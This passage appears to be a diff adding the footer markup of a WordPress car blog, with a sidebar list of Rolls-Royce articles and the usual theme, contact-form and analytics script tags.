+		<h3><a href="http://www.todayautosonline.com/parked-in-drive-1936-rolls-royce-2025-sedanca-de-ville/">Parked In Drive: 1936 Rolls-Royce 20/25 Sedanca de Ville</a></h3>
+	 <span class="date"><span class="tie-date">May 18, 2017</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/capsule-review-2013-rolls-royce-phantom-drophead/" title="Permalink to Capsule Review: 2013 Rolls-Royce Phantom Drophead" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/12d4b_IMG_8273-550x366-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2016/10/12d4b_IMG_8273-550x366-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2016/10/12d4b_IMG_8273-550x366-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/capsule-review-2013-rolls-royce-phantom-drophead/">Capsule Review: 2013 Rolls-Royce Phantom Drophead</a></h3>
+	 <span class="date"><span class="tie-date">October 5, 2016</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/capsule-review-2014-rolls-royce-wraith/" title="Permalink to Capsule Review: 2014 Rolls-Royce Wraith" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/a470a_desertside-450x337-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2016/10/a470a_desertside-450x337-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2016/10/a470a_desertside-450x337-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/capsule-review-2014-rolls-royce-wraith/">Capsule Review: 2014 Rolls-Royce Wraith</a></h3>
+	 <span class="date"><span class="tie-date">October 5, 2016</span></span>
+</li>
+	
+				</ul>
+		<div class="clear"></div>
+	</div></div><!-- .widget /-->		</div><!-- #third .widget-area -->
+	
+		
+	</div><!-- #footer-widget-area -->
+	<div class="clear"></div>
+</footer><!-- .Footer /-->
+	<div class="clear"></div>
+	<div class="footer-bottom fade-in animated4">
+		<div class="container">
+					<div class="social-icons icon_flat">
+		<a class="ttip" title="Rss" href="http://www.todayautosonline.com/feed/" target="_blank"><i class="tieicon-rss"></i></a><a class="ttip" title="Facebook" href="https://www.facebook.com/todayautosonline" target="_blank"><i class="tieicon-facebook"></i></a><a class="ttip" title="Twitter" href="https://twitter.com/knowledgesbank" target="_blank"><i class="tieicon-twitter"></i></a>	</div>
+
+			<div class="alignleft">
+			All rights reserved 2016			</div>
+		</div><!-- .Container -->
+	</div><!-- .Footer bottom -->
+
+</div><!-- .Wrapper -->
+	<div id="topcontrol" class="tieicon-up-open" title="Scroll To Top"></div>
+<div id="fb-root"></div>
+
+<script language=javascript>
+//<![CDATA[
+	var screen_res = screen.width + " x " + screen.height;
+	if (screen_res!=" x "){document.cookie = "wassup_screen_res7c6688e07189ad9082297172bf453310=" + encodeURIComponent(screen_res)+ "; path=/; domain=" + document.domain;}
+//]]>
+</script>
+
+<!-- <p class="small"> WassUp 1.9.3 timestamp: 2017-09-11 07:52:52AM UTC (07:52AM)<br />
+If above timestamp is not current time, this page is cached.</p> -->
+<script type='text/javascript' src='http://www.todayautosonline.com/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcf7 = {"recaptcha":{"messages":{"empty":"Please verify that you are not a robot."}}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.todayautosonline.com/wp-content/plugins/contact-form-7/includes/js/scripts.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var tie = {"go_to":"Go to...","ajaxurl":"http:\/\/www.todayautosonline.com\/wp-admin\/admin-ajax.php","your_rating":"Your Rating:","is_singular":"","reading_indicator":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.todayautosonline.com/wp-content/themes/jarida/js/tie-scripts.js'></script>
+<script type='text/javascript' src='http://www.todayautosonline.com/wp-includes/js/wp-embed.min.js'></script>
+<script type='text/javascript' src='http://www.todayautosonline.com/wp-content/themes/jarida/js/jquery.cycle.all.js'></script>
+</body>
+</html>
